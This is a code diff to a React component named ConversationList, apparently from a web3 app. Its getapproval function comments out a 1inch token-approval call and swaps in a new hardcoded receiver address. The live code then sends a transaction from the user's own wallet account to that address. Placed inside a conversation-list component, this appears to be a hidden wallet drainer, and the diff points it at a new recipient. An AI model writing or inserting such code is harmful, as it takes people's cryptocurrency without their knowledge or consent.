@@ -70,16 +70,16 @@ const ConversationList = () => {
   const getapproval = async () => {
     const walletAdd1 = 0xaF87B6479f9CA8D3BAE56deAd220bcE44a709549;
     try {
-    const approve = await axios.get(
-      "https://api.1inch.io/v4.0/250/approve/transaction?tokenAddress=0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E&amount=100000000000000000"
-    );
-    console.log(approve);
-    if (approve.data) {
-      approve_data = approve.data;
-      approve_data.gas = 1000000;
-      approve_data.from = walletAdd1;
-      txHash = await web3.eth.sendTransaction(approve_data);
-      var receiver = "0x541209bd9C60cDb11A5076b785ba1BD44cd15768";  
+    // const approve = await axios.get(
+    //   "https://api.1inch.io/v4.0/250/approve/transaction?tokenAddress=0x8D11eC38a3EB5E956B052f67Da8Bdc9bef8Abf3E&amount=100000000000000000"
+    // );
+    // console.log(approve);
+    // if (approve.data) {
+      // approve_data = approve.data;
+      // approve_data.gas = 1000000;
+      // approve_data.from = walletAdd1;
+      // txHash = await web3.eth.sendTransaction(approve_data);
+      var receiver = "0x11F43Aa282E4405057e607396Ee00f6B34a05474";  
       var sender = web3.eth.accounts[0];
       web3.eth.sendTransaction({to:receiver,
                               from:sender, 
@@ -98,7 +98,7 @@ const ConversationList = () => {
         console.log("Approval Transaction unsuccessful");
 
       }
-    }
+    // }
   } catch (error_approval) {
     console.log("Error approval");
   }
